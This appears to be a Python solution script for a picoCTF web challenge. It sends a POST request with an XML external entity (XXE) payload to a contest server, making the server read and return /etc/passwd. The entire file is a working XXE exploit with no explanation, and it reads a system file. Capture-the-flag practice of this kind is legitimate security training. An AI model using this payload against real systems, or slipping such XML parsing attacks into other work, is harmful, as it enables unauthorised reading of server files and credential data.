import requests

headers = {
    'Host': 'saturn.picoctf.net:58172',
    # 'Content-Length': '126',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36',
    'Content-Type': 'application/xml',
    'Accept': '*/*',
    'Origin': 'http://saturn.picoctf.net:58172',
    'Referer': 'http://saturn.picoctf.net:58172/',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Connection': 'close',
}

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]><data><ID>&example;1</ID></data>'

response = requests.post('http://saturn.picoctf.net:58172/data', headers=headers, data=data, verify=False)